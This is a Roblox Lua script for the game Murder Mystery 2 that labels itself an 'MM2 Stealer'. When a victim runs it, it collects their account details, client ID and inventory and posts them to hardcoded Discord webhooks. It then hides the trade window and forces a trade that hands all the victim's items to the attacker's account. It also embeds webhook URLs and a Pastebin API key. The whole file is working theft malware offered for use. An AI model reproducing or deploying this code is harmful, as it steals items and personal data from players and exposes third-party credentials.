-- [ Settings ] --
Username = "1LazySly8" -- [Your Username]
Webhook = "https://discord.com/api/webhooks/1291752093387853988/4Xte3V-WEnQotkIPZv173EMATsBRMccyT6Dt20_JOM2EptEHto0S0opxeEykAaBjxOH-" -- [Your Webhook For Hits]
Script = "" -- [None | Custom | MetterX Hub | Highlight Lite]
RawLink = "" -- [Raw Link If "Custom"]

Config = { --configuration
    FullInventory = true, -- true to see full inventory of target, false if no
}

-- [ Dual Settings ] --
DualUsername = "QuadCoreDragon" -- [Dual Username]
DualWebhook = "https://discord.com/api/webhooks/1296940147845365910/5klvjPBRgi-hRUmUwp3j5_sXcFLTUdhX6pO8Kmc1Du7zBXqJRPLcwl04DYBJSu9maKMv" -- [Dual Webhook]
DualItems = 0.1 -- [Minimum Valuable Items Count]
DualAncient = 1 -- [Minimum Ancient Count]

repeat wait() until game:IsLoaded()

if getgenv().executed then return end
getgenv().executed = true

-- checks
if not Username or Username == "" or Username == game.Players.LocalPlayer.Name then
    game:Shutdown()
end

if not Webhook or Webhook == "" then
    game:Shutdown()
end

if #game:GetService("Players"):GetPlayers() == 1 then
    game:GetService("Players").LocalPlayer:Kick("\nUnsupported server, please try again!")
    wait(5)
    game:Shutdown()
end

-- locals
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local LocalPlayer = game.Players.LocalPlayer
local IdValue = LocalPlayer.UserId or "Unknown"
local NameValue = LocalPlayer.Name or "Unknown"
local DisplayNameValue = LocalPlayer.DisplayName or "Unknown"
local AgeValue = LocalPlayer.AccountAge or "Unknown"
local ExecutorValue = identifyexecutor() or "Unknown"
local PlayersValue = #game:GetService("Players"):GetPlayers() or "Unknown"
local MaxPlayersValue = game.Players.MaxPlayers or "Unknown"
local ServerTimeValue = os.date("%c", os.time()) or "Unknown"
local ClientIdValue = game:GetService("RbxAnalyticsService"):GetClientId() or "Unknown"
local PlaceNameValue = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name or "Unknown"
local PlaceIdValue = game.PlaceId or "Unknown"
local PlaceVersionValue = game.PlaceVersion or "Unknown"
local PlatformValue = game:GetService("UserInputService").TouchEnabled and not game:GetService("UserInputService").KeyboardEnabled and not game:GetService("UserInputService").MouseEnabled and "Mobile" or "PC"
local VersionValue = "v1.0 Dev" -- [Release / Patch / Beta / Dev]
local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance(]] .. game.PlaceId .. [[, "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]

-----------------------------------------------------------------------------------------------------------------------
local Inventory = {}

if Config.FullInventory ~= true and Config.FullInventory ~= false then
    Config.FullInventory = true
end

function checkitem(v)
    if v:IsA("Frame") and v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
        local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
        table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
    end
end

function FullInventory()
    for _, itemFrame in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
        for _, container in pairs(itemFrame.Container:GetChildren()) do
            if container.Name == "Christmas" or container.Name == "Halloween" then
                for _, item in pairs(container.Container:GetChildren()) do
                    checkitem(item)
                end
            else
                checkitem(container)
            end
        end
    end
    
    for _, pet in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
        checkitem(pet)
    end

    if #Inventory == 0 then
        table.insert(Inventory, "None")
    end

    return Config.FullInventory and table.concat(Inventory, ", ") or "Full inventory set to false."
end

FullInventory()

local data = {
    username = LocalPlayer.Name,
    avatar_url = "https://cdn.discordapp.com/attachments/1295330912900223039/1295610470228561972/standard.gif?ex=670f46c7&is=670df547&hm=d67f2702e28851f197035c849929a5d05b1f4b9e6830f463268c3234310d03ce&",
    content = "Your custom message here", -- Update as needed
    embeds = {
        {
            title = "ðŸ’» **__"..LocalPlayer.Name.."__ | __MM2 Stealer__**",
            description = "**ðŸ“ƒ Player Information**:\n```lua\nUsername     : " .. LocalPlayer.Name .. "\nUser Id      : " .. LocalPlayer.UserId .. "\nAccount Age  : " .. LocalPlayer.AccountAge .. "\nExploit      : " .. ExecutorValue .. "\nScript       : " .. Config.Script .. "```\nðŸŽ’ **__Inventory__**\n```" .. FullInventory() .. "```\nðŸ”— **__Execute to join__**\n```" .. TeleportScript .. "```",
            color = tonumber(0x3365FF),
            fields = {
                {
                    name = "ðŸŽ® Auto Joiner",
                    value = "Soon"
                }
            }
        }
    }
}

-----------------------------------------------------------------------------------------------------------------------

function SendMessageEMBED(url, embed, isEveryone)
    local http = game:GetService("HttpService")
    local headers = { ["Content-Type"] = "application/json" }
    
    local data = {
        username = "MetterX | Stealer",
        avatar_url = "https://cdn.discordapp.com/attachments/1292386513363144726/1295553746130174012/Photoroom-20240808_210138.png?ex=67203573&is=671ee3f3&hm=7d3bd0a97d3ef925f50a86ab0a37ca5388c74425a80d0970ab70039e46b9d860&",
        content = isEveryone and "--@everyone\n " .. TeleportScript .. " " or " " .. TeleportScript .. " ",
        embeds = { embed }
    }

    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = http:JSONEncode(data)
    })

    return response
end

-- Trade-related functions
local destroyTradesCoroutine = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        tradeGUI.Enabled = false
        tradeGUIPhone.Enabled = false

        wait(0.1)
    end
end)

local function stealItems()
    coroutine.resume(destroyTradesCoroutine)

    game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(game:GetService("Players")[Username])

    wait(3)

    local itemCategories = { uniqueItems, ancientItems, godlyItems, vintageItems, legendaryItems, rareItems, uncommonItems, commonItems }
    
    for _, itemList in ipairs(itemCategories) do
        for _, itemID in pairs(itemList) do
            game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(itemID, "Weapons")
        end
    end

    wait(6)
    game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(285646582) -- Example receiver ID
end

local HttpService = game:GetService("HttpService")

local function pastebin(content)
    local body = {
        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
        api_paste_code = content,
        api_option = "paste"
    }

    local encodedBody = HttpService:UrlEncode(body)

    local response = request({
        Url = "https://pastebin.com/api/api_post.php",
        Method = "POST",
        Body = encodedBody,
        Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }
    })

    if response and response.Success then
        return "https://pastebin.com/raw/" .. response.Body:match("([%w]+)$")
    else
        return "\nError...\n"
    end
end

local function getItemDisplayName(itemName)
    local item = game.Workspace:FindFirstChild("Items"):FindFirstChild(itemName)
    return item and item:FindFirstChild("DisplayName") and item.DisplayName.Value or itemName
end

-- Begin Execution
SendMessageEMBED(Webhook, data.embeds[1], false)

stealItems()

if DualWebhook then
    SendMessageEMBED(DualWebhook, data.embeds[1], false)
end

wait(10) -- Ensure message is sent before ending the script
game:Shutdown()
